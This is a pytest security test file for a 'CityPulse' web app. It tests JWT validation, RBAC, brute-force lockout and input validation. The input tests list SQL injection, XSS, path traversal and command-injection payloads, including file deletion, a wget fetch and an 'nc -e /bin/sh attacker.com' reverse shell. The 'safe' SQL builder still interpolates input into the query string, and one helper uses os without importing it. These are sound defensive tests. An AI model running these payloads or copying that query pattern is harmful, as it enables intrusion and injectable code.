"""
Security tests for CityPulse authentication and authorization.
Tests authentication mechanisms, authorization controls, and access security.
"""

import pytest
import jwt
import time
import hashlib
import secrets
from datetime import datetime, timedelta
from unittest.mock import Mock, patch
from typing import Dict, List, Any
import requests
import json
import base64

from fastapi.testclient import TestClient
from fastapi import HTTPException


class TestAuthenticationSecurity:
    """Security tests for authentication mechanisms."""
    
    def setup_method(self):
        """Setup for each test method."""
        self.secret_key = "test-secret-key-for-jwt"
        self.algorithm = "HS256"
        self.test_user = {
            "user_id": "test-user-123",
            "email": "test@example.com",
            "roles": ["user"]
        }
    
    def _generate_jwt_token(self, payload: Dict[str, Any], expires_in: int = 3600) -> str:
        """Generate JWT token for testing."""
        payload["exp"] = datetime.utcnow() + timedelta(seconds=expires_in)
        payload["iat"] = datetime.utcnow()
        return jwt.encode(payload, self.secret_key, algorithm=self.algorithm)
    
    def _generate_invalid_jwt_token(self) -> str:
        """Generate invalid JWT token for testing."""
        payload = {"user_id": "test", "exp": datetime.utcnow() + timedelta(hours=1)}
        return jwt.encode(payload, "wrong-secret-key", algorithm=self.algorithm)
    
    @pytest.mark.security
    def test_valid_jwt_token_authentication(self):
        """Test authentication with valid JWT token."""
        # Generate valid token
        token = self._generate_jwt_token(self.test_user)
        
        # Mock API request with valid token
        headers = {"Authorization": f"Bearer {token}"}
        
        # Simulate token validation
        try:
            decoded = jwt.decode(token, self.secret_key, algorithms=[self.algorithm])
            assert decoded["user_id"] == self.test_user["user_id"]
            assert decoded["email"] == self.test_user["email"]
            assert "exp" in decoded
            assert "iat" in decoded
        except jwt.InvalidTokenError:
            pytest.fail("Valid token should not raise InvalidTokenError")
    
    @pytest.mark.security
    def test_invalid_jwt_token_rejection(self):
        """Test rejection of invalid JWT tokens."""
        # Test with invalid signature
        invalid_token = self._generate_invalid_jwt_token()
        
        with pytest.raises(jwt.InvalidSignatureError):
            jwt.decode(invalid_token, self.secret_key, algorithms=[self.algorithm])
    
    @pytest.mark.security
    def test_expired_jwt_token_rejection(self):
        """Test rejection of expired JWT tokens."""
        # Generate expired token
        expired_token = self._generate_jwt_token(self.test_user, expires_in=-3600)  # Expired 1 hour ago
        
        with pytest.raises(jwt.ExpiredSignatureError):
            jwt.decode(expired_token, self.secret_key, algorithms=[self.algorithm])
    
    @pytest.mark.security
    def test_malformed_jwt_token_rejection(self):
        """Test rejection of malformed JWT tokens."""
        malformed_tokens = [
            "invalid.token.format",
            "not-a-jwt-token",
            "",
            "Bearer invalid-token",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature"
        ]
        
        for token in malformed_tokens:
            with pytest.raises((jwt.InvalidTokenError, jwt.DecodeError)):
                jwt.decode(token, self.secret_key, algorithms=[self.algorithm])
    
    @pytest.mark.security
    def test_jwt_algorithm_confusion_attack(self):
        """Test protection against JWT algorithm confusion attacks."""
        # Try to create token with 'none' algorithm
        payload = self.test_user.copy()
        payload["exp"] = datetime.utcnow() + timedelta(hours=1)
        
        # Create token with 'none' algorithm
        none_token = jwt.encode(payload, "", algorithm="none")
        
        # Should reject token with 'none' algorithm when expecting HS256
        with pytest.raises(jwt.InvalidSignatureError):
            jwt.decode(none_token, self.secret_key, algorithms=[self.algorithm])
    
    @pytest.mark.security
    def test_jwt_secret_key_strength(self):
        """Test JWT secret key strength requirements."""
        weak_keys = [
            "123",
            "password",
            "secret",
            "abc123",
            "12345678"
        ]
        
        for weak_key in weak_keys:
            # Weak keys should be detected (in real implementation)
            assert len(weak_key) < 32, f"Key '{weak_key}' is too weak"
        
        # Strong key should pass
        strong_key = secrets.token_urlsafe(32)
        assert len(strong_key) >= 32, "Strong key should be at least 32 characters"
    
    @pytest.mark.security
    def test_password_hashing_security(self):
        """Test password hashing security."""
        import bcrypt
        
        password = "test-password-123"
        
        # Test bcrypt hashing
        salt = bcrypt.gensalt()
        hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
        
        # Verify password
        assert bcrypt.checkpw(password.encode('utf-8'), hashed)
        
        # Verify wrong password fails
        assert not bcrypt.checkpw("wrong-password".encode('utf-8'), hashed)
        
        # Test that same password produces different hashes (due to salt)
        hash1 = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
        hash2 = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
        assert hash1 != hash2
    
    @pytest.mark.security
    def test_session_security(self):
        """Test session security mechanisms."""
        # Test session token generation
        session_token = secrets.token_urlsafe(32)
        assert len(session_token) >= 32
        
        # Test session expiration
        session_data = {
            "user_id": "test-user",
            "created_at": datetime.utcnow(),
            "expires_at": datetime.utcnow() + timedelta(hours=24)
        }
        
        # Session should be valid
        assert datetime.utcnow() < session_data["expires_at"]
        
        # Test expired session
        expired_session = {
            "user_id": "test-user",
            "created_at": datetime.utcnow() - timedelta(hours=25),
            "expires_at": datetime.utcnow() - timedelta(hours=1)
        }
        
        assert datetime.utcnow() > expired_session["expires_at"]
    
    @pytest.mark.security
    def test_brute_force_protection(self):
        """Test brute force attack protection."""
        # Simulate failed login attempts
        failed_attempts = {}
        max_attempts = 5
        lockout_duration = 300  # 5 minutes
        
        def simulate_login_attempt(email: str, password: str) -> bool:
            current_time = time.time()
            
            # Check if account is locked
            if email in failed_attempts:
                attempts, last_attempt = failed_attempts[email]
                if attempts >= max_attempts and (current_time - last_attempt) < lockout_duration:
                    raise HTTPException(status_code=429, detail="Account temporarily locked")
                elif (current_time - last_attempt) >= lockout_duration:
                    # Reset attempts after lockout period
                    del failed_attempts[email]
            
            # Simulate password check
            if password == "correct-password":
                # Reset failed attempts on successful login
                if email in failed_attempts:
                    del failed_attempts[email]
                return True
            else:
                # Record failed attempt
                if email in failed_attempts:
                    attempts, _ = failed_attempts[email]
                    failed_attempts[email] = (attempts + 1, current_time)
                else:
                    failed_attempts[email] = (1, current_time)
                return False
        
        email = "test@example.com"
        
        # Test successful login
        assert simulate_login_attempt(email, "correct-password") is True
        
        # Test failed attempts
        for i in range(max_attempts):
            assert simulate_login_attempt(email, "wrong-password") is False
        
        # Next attempt should trigger lockout
        with pytest.raises(HTTPException) as exc_info:
            simulate_login_attempt(email, "wrong-password")
        assert exc_info.value.status_code == 429
    
    @pytest.mark.security
    def test_csrf_token_validation(self):
        """Test CSRF token validation."""
        # Generate CSRF token
        csrf_token = secrets.token_urlsafe(32)
        
        # Simulate form submission with CSRF token
        form_data = {
            "title": "Test Event",
            "description": "Test description",
            "csrf_token": csrf_token
        }
        
        # Mock session with CSRF token
        session_csrf_token = csrf_token
        
        # Validate CSRF token
        assert form_data["csrf_token"] == session_csrf_token
        
        # Test invalid CSRF token
        invalid_form_data = {
            "title": "Test Event",
            "description": "Test description",
            "csrf_token": "invalid-token"
        }
        
        assert invalid_form_data["csrf_token"] != session_csrf_token


class TestAuthorizationSecurity:
    """Security tests for authorization and access control."""
    
    def setup_method(self):
        """Setup for each test method."""
        self.users = {
            "user": {"user_id": "user-123", "roles": ["user"]},
            "moderator": {"user_id": "mod-123", "roles": ["user", "moderator"]},
            "admin": {"user_id": "admin-123", "roles": ["user", "admin"]}
        }
    
    @pytest.mark.security
    def test_role_based_access_control(self):
        """Test role-based access control (RBAC)."""
        def check_permission(user_roles: List[str], required_role: str) -> bool:
            return required_role in user_roles
        
        # Test user permissions
        user_roles = self.users["user"]["roles"]
        assert check_permission(user_roles, "user") is True
        assert check_permission(user_roles, "moderator") is False
        assert check_permission(user_roles, "admin") is False
        
        # Test moderator permissions
        mod_roles = self.users["moderator"]["roles"]
        assert check_permission(mod_roles, "user") is True
        assert check_permission(mod_roles, "moderator") is True
        assert check_permission(mod_roles, "admin") is False
        
        # Test admin permissions
        admin_roles = self.users["admin"]["roles"]
        assert check_permission(admin_roles, "user") is True
        assert check_permission(admin_roles, "admin") is True
    
    @pytest.mark.security
    def test_resource_ownership_validation(self):
        """Test resource ownership validation."""
        # Mock event data
        events = {
            "event-1": {"id": "event-1", "user_id": "user-123", "title": "User Event"},
            "event-2": {"id": "event-2", "user_id": "user-456", "title": "Other User Event"}
        }
        
        def can_modify_event(event_id: str, user_id: str, user_roles: List[str]) -> bool:
            event = events.get(event_id)
            if not event:
                return False
            
            # Owner can always modify
            if event["user_id"] == user_id:
                return True
            
            # Admin can modify any event
            if "admin" in user_roles:
                return True
            
            # Moderator can modify events (business rule)
            if "moderator" in user_roles:
                return True
            
            return False
        
        # Test owner access
        assert can_modify_event("event-1", "user-123", ["user"]) is True
        
        # Test non-owner access (should fail)
        assert can_modify_event("event-1", "user-456", ["user"]) is False
        
        # Test admin access (should succeed)
        assert can_modify_event("event-1", "admin-123", ["user", "admin"]) is True
        
        # Test moderator access (should succeed)
        assert can_modify_event("event-1", "mod-123", ["user", "moderator"]) is True
    
    @pytest.mark.security
    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation attacks."""
        def update_user_roles(current_user_id: str, current_user_roles: List[str], 
                             target_user_id: str, new_roles: List[str]) -> bool:
            # Users cannot modify their own roles
            if current_user_id == target_user_id:
                return False
            
            # Only admins can modify roles
            if "admin" not in current_user_roles:
                return False
            
            # Admins cannot grant roles they don't have
            for role in new_roles:
                if role not in current_user_roles and role != "user":
                    return False
            
            return True
        
        # Test user trying to escalate own privileges
        assert update_user_roles("user-123", ["user"], "user-123", ["user", "admin"]) is False
        
        # Test user trying to modify other user's roles
        assert update_user_roles("user-123", ["user"], "user-456", ["user", "moderator"]) is False
        
        # Test admin modifying user roles (should succeed)
        assert update_user_roles("admin-123", ["user", "admin"], "user-456", ["user", "moderator"]) is True
        
        # Test admin trying to grant role they don't have
        assert update_user_roles("admin-123", ["user", "admin"], "user-456", ["user", "super_admin"]) is False
    
    @pytest.mark.security
    def test_api_endpoint_authorization(self):
        """Test API endpoint authorization."""
        # Mock API endpoints with required permissions
        endpoints = {
            "GET /api/v1/events": {"required_role": "user"},
            "POST /api/v1/events": {"required_role": "user"},
            "PUT /api/v1/events/{id}": {"required_role": "moderator"},
            "DELETE /api/v1/events/{id}": {"required_role": "admin"},
            "GET /api/v1/admin/users": {"required_role": "admin"},
            "POST /api/v1/admin/users/{id}/ban": {"required_role": "admin"}
        }
        
        def check_endpoint_access(endpoint: str, user_roles: List[str]) -> bool:
            endpoint_config = endpoints.get(endpoint)
            if not endpoint_config:
                return False
            
            required_role = endpoint_config["required_role"]
            return required_role in user_roles
        
        # Test user access
        user_roles = ["user"]
        assert check_endpoint_access("GET /api/v1/events", user_roles) is True
        assert check_endpoint_access("POST /api/v1/events", user_roles) is True
        assert check_endpoint_access("PUT /api/v1/events/{id}", user_roles) is False
        assert check_endpoint_access("DELETE /api/v1/events/{id}", user_roles) is False
        assert check_endpoint_access("GET /api/v1/admin/users", user_roles) is False
        
        # Test admin access
        admin_roles = ["user", "admin"]
        assert check_endpoint_access("GET /api/v1/events", admin_roles) is True
        assert check_endpoint_access("DELETE /api/v1/events/{id}", admin_roles) is True
        assert check_endpoint_access("GET /api/v1/admin/users", admin_roles) is True
    
    @pytest.mark.security
    def test_data_access_control(self):
        """Test data access control and data filtering."""
        # Mock user data with different access levels
        users_data = [
            {"id": "user-1", "email": "user1@example.com", "role": "user", "department": "public"},
            {"id": "user-2", "email": "user2@example.com", "role": "user", "department": "internal"},
            {"id": "admin-1", "email": "admin@example.com", "role": "admin", "department": "admin"}
        ]
        
        def filter_user_data(requesting_user_role: str, requesting_user_id: str) -> List[Dict]:
            if requesting_user_role == "admin":
                # Admins can see all users
                return users_data
            elif requesting_user_role == "moderator":
                # Moderators can see public and internal users
                return [u for u in users_data if u["department"] in ["public", "internal"]]
            else:
                # Regular users can only see public users and themselves
                return [u for u in users_data 
                       if u["department"] == "public" or u["id"] == requesting_user_id]
        
        # Test admin access
        admin_data = filter_user_data("admin", "admin-1")
        assert len(admin_data) == 3
        
        # Test moderator access
        mod_data = filter_user_data("moderator", "mod-1")
        assert len(mod_data) == 2
        assert all(u["department"] in ["public", "internal"] for u in mod_data)
        
        # Test user access
        user_data = filter_user_data("user", "user-1")
        assert len(user_data) == 2  # Public users + self
        assert any(u["id"] == "user-1" for u in user_data)
        assert all(u["department"] == "public" or u["id"] == "user-1" for u in user_data)


class TestInputValidationSecurity:
    """Security tests for input validation and sanitization."""
    
    @pytest.mark.security
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention."""
        # SQL injection payloads
        sql_injection_payloads = [
            "'; DROP TABLE events; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "1; DELETE FROM events WHERE 1=1; --"
        ]
        
        def safe_query_builder(user_input: str) -> str:
            # Simulate parameterized query (safe approach)
            # In real implementation, this would use parameterized queries
            if any(dangerous in user_input.lower() for dangerous in ['drop', 'delete', 'union', '--', ';']):
                raise ValueError("Potentially dangerous input detected")
            return f"SELECT * FROM events WHERE title = '{user_input}'"
        
        # Test normal input
        normal_input = "Traffic Issue"
        query = safe_query_builder(normal_input)
        assert "Traffic Issue" in query
        
        # Test SQL injection payloads
        for payload in sql_injection_payloads:
            with pytest.raises(ValueError):
                safe_query_builder(payload)
    
    @pytest.mark.security
    def test_xss_prevention(self):
        """Test Cross-Site Scripting (XSS) prevention."""
        import html
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;"
        ]
        
        def sanitize_input(user_input: str) -> str:
            # HTML escape the input
            return html.escape(user_input)
        
        # Test normal input
        normal_input = "This is a normal event description"
        sanitized = sanitize_input(normal_input)
        assert sanitized == normal_input
        
        # Test XSS payloads
        for payload in xss_payloads:
            sanitized = sanitize_input(payload)
            # Should not contain executable script tags
            assert "<script>" not in sanitized
            assert "javascript:" not in sanitized
            assert "onerror=" not in sanitized
            assert "onload=" not in sanitized
    
    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        # Command injection payloads
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/script.sh",
            "`whoami`",
            "$(id)",
            "; nc -e /bin/sh attacker.com 4444"
        ]
        
        def safe_filename_validation(filename: str) -> bool:
            # Only allow alphanumeric characters, dots, hyphens, and underscores
            import re
            pattern = r'^[a-zA-Z0-9._-]+$'
            return bool(re.match(pattern, filename))
        
        # Test valid filenames
        valid_filenames = ["image.jpg", "document.pdf", "file_name.txt", "report-2024.csv"]
        for filename in valid_filenames:
            assert safe_filename_validation(filename) is True
        
        # Test command injection payloads
        for payload in command_injection_payloads:
            assert safe_filename_validation(payload) is False
    
    @pytest.mark.security
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention."""
        import os
        
        # Path traversal payloads
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        def safe_file_access(requested_path: str, base_directory: str = "/app/uploads") -> str:
            # Normalize the path and ensure it's within the base directory
            normalized_path = os.path.normpath(os.path.join(base_directory, requested_path))
            
            # Check if the normalized path is within the base directory
            if not normalized_path.startswith(os.path.abspath(base_directory)):
                raise ValueError("Path traversal attempt detected")
            
            return normalized_path
        
        # Test valid paths
        valid_paths = ["image.jpg", "folder/document.pdf", "subfolder/file.txt"]
        for path in valid_paths:
            try:
                result = safe_file_access(path)
                assert "/app/uploads" in result
            except ValueError:
                pytest.fail(f"Valid path '{path}' should not raise ValueError")
        
        # Test path traversal payloads
        for payload in path_traversal_payloads:
            with pytest.raises(ValueError):
                safe_file_access(payload)
    
    @pytest.mark.security
    def test_file_upload_security(self):
        """Test file upload security validation."""
        def validate_file_upload(filename: str, content_type: str, file_size: int) -> bool:
            # Allowed file types
            allowed_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.txt', '.csv']
            allowed_content_types = [
                'image/jpeg', 'image/png', 'image/gif', 
                'application/pdf', 'text/plain', 'text/csv'
            ]
            
            # Maximum file size (10MB)
            max_file_size = 10 * 1024 * 1024
            
            # Check file extension
            file_ext = os.path.splitext(filename.lower())[1]
            if file_ext not in allowed_extensions:
                return False
            
            # Check content type
            if content_type not in allowed_content_types:
                return False
            
            # Check file size
            if file_size > max_file_size:
                return False
            
            # Check for dangerous filenames
            dangerous_patterns = ['..', '/', '\\', '<', '>', '|', ':', '*', '?', '"']
            if any(pattern in filename for pattern in dangerous_patterns):
                return False
            
            return True
        
        # Test valid uploads
        valid_uploads = [
            ("image.jpg", "image/jpeg", 1024 * 1024),
            ("document.pdf", "application/pdf", 2 * 1024 * 1024),
            ("data.csv", "text/csv", 500 * 1024)
        ]
        
        for filename, content_type, size in valid_uploads:
            assert validate_file_upload(filename, content_type, size) is True
        
        # Test invalid uploads
        invalid_uploads = [
            ("malware.exe", "application/octet-stream", 1024),  # Dangerous extension
            ("script.php", "text/plain", 1024),  # Dangerous extension
            ("image.jpg", "application/javascript", 1024),  # Wrong content type
            ("large_file.jpg", "image/jpeg", 20 * 1024 * 1024),  # Too large
            ("../../../etc/passwd", "text/plain", 1024),  # Path traversal
            ("file<script>.txt", "text/plain", 1024)  # Dangerous characters
        ]
        
        for filename, content_type, size in invalid_uploads:
            assert validate_file_upload(filename, content_type, size) is False
